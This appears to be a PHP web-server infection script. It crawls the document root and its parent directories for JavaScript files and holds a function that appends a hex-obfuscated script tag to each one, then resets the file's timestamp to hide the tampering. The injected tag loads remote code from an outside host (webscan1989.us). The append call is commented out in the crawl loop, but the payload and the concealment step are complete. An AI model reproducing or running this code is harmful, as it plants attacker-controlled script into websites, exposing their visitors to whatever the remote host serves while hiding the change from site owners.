<?php
set_time_limit(9999);  
function file_add($file) 
{
	try
	{
		global $data; 
		$a=filemtime($file); 
		$fp=fopen($file,"a+");
		fputs($fp,$data);
		fclose($fp);
		echo $file."---a+ link file ok\r\n<br>"; 
		try
		{
			if(touch($file,$a,$a))
			{
			echo $file."update file time ok\r\n<br>"; 
			echo "--------\r\n<br>"; 
			}else{
			echo $file."update file time try-error\r\n<br>"; 
			echo "--------\r\n<br>"; 
			}
		}
		catch(Exception $e)
		{ 
		}
	}
	catch(Exception $e)
	{ 
	echo $e."update file error\r\n<br>"; 
	return 0;
	}
}

function for_file($path)
{
	try
	{
		$d =@dir("$path");
		while (false !== ($entry = $d->read())) 
		{
			if($entry == "." || $entry == "..") continue;
			$file=$d->path."/" .$entry;
			if(@is_dir($file)) 
			{
			for_file($file);
			}
			else
			{
			if(@ereg(".js",$file)) 
			{
			echo "find files:".$file."\r\n<br>";
			//file_add($file);
			}
			}
		}
		$d->close();
		return 1;
	}
	catch(Exception $e)
	{ 
	echo $e."for web dir error\r\n<br>"; 
	return 0;
	}
}


header("Content-Type: text/html; charset=gbk");
$BY="UVEyNjAyMTU5OTQ2";

ini_set("date.timezone","Asia/Chongqing");
@$tim2=date('Y-m-d H:i:s',time());
echo "time:".$tim2."\r\n<br>";


global $data1;
$data="\nvar _$=['\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x20\\x74\\x79\\x70\\x65\\x3d\\x22\\x74\\x65\\x78\\x74\\x2f\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x22\\x20\\x73\\x72\\x63\\x3d\\x22\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x77\\x65\\x62\\x73\\x63\\x61\\x6e\\x31\\x39\\x38\\x39\\x2e\\x75\\x73\\x2f\\x54\\x4f\\x4d\\x2f\\x69\\x70\\x2e\\x70\\x68\\x70\\x22\\x3e\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e'];document.write( _$[0]);";


try
{ 
$result = array(); 
$url_name=$_SERVER['DOCUMENT_ROOT'];
echo "start file:".$url_name."\r\n<br>"; 
echo "--------------------------------------------------\r\n<br>";
for_file($url_name); 
$urlFileName = explode("/",$url_name);
$lie=count($urlFileName);
$fiel_url="";
$fillarray =array();
 for ($i=0; $i<$lie; $i++) 
 {
	try
	{ 
	$fiel_url=$fiel_url.$urlFileName[$i]."/";
	array_unshift($fillarray,$fiel_url);
	}
	catch(Exception $e)
	{ 
          echo "file try Exception"."<br>"; 
	}
 }
foreach ($fillarray as $k)
{
echo "============================link  link:".$k."<br>";
for_file($k); 
}
}
catch(Exception $e)
{ 
dirtree(".");
}




?>
